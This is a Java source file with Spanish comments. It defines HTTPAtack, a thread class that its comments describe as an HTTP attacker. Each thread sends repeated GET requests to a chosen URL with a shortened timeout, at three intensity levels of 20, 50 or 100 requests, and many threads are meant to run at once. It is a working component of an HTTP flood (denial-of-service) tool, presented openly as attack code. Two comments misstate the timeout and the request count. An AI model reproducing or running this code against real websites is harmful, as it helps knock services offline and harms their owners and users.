package br.com.pricher.server;

import java.net.*;

/*
 *  Clase que se encarga de realizar ataques HTTP. Esta clase abre N conexiones
 *  HTTP con la URL seleccionada (si esta es valida). Se ha reducido el tiempo
 *  de TimeOut para pasar a la siguiente llamada HTTP.
 *
 *  Esta clase extiende de Thread para crear hilos atacantes y asi hacer mas
 *  eficientes los ataques.
 */
class HTTPAtack extends Thread {

    // Intensidad
    public static final int LOW = 1;
    public static final int MEDIUM = 2;
    public static final int HIGH = 3;

    // Numero de peticiones segun la intensidad
    public static final int REQUEST_LOW = 20;
    public static final int REQUEST_MEDIUM = 50;
    public static final int REQUEST_HIGH = 100;

    // URL a a atacar
    URL url;
    // Intensidad del ataque
    int intensity;

    // Iniciamos la clase
    HTTPAtack(String url, int intensity) {
        try {
            this.url = new URL(url);
            this.intensity = intensity;
        } catch (Exception e) {
            System.out.println(e);
        }

    }

    // Comienza el hilo. Este realiza 100 peticiones HTTP y va mostrando el
    // tiempo de respuesta de cada peticion
    public void run() {
        int i = 0;
        int request = getNumRequest(this.intensity);
        // Comenzamos las peticiones
        while (i < request) {
            try {
                // Realizamos la conexion
                HttpURLConnection conn = (HttpURLConnection) this.url.openConnection();
                conn.setAllowUserInteraction(true);
                conn.setConnectTimeout(5000); // 15 sec. connection timeout
                conn.setDoInput(true);
                conn.setDoOutput(false);
                conn.setUseCaches(false);
                conn.setRequestMethod("GET");
                conn.setRequestProperty("Content-type", "text/html; charset=" + "UTF-8");

                conn.connect();
                // Obtenemos los datos, si no la peticion GET no se llega a realizar.
                // Si no ejecutamos getResponse, solo abririamos la conexion TCP.
                conn.getResponseCode();
            } catch (Exception e) {
                System.out.println(e);
            }
            i++;
        }
    }

    /*
   * Devuelve el numero de peticiones en funcion de la intensidad
   */
    public static int getNumRequest(int intensity) {
        switch (intensity) {
            case LOW:
                return REQUEST_LOW;
            case MEDIUM:
                return REQUEST_MEDIUM;
            default:
                return REQUEST_HIGH;
        }
    }
}
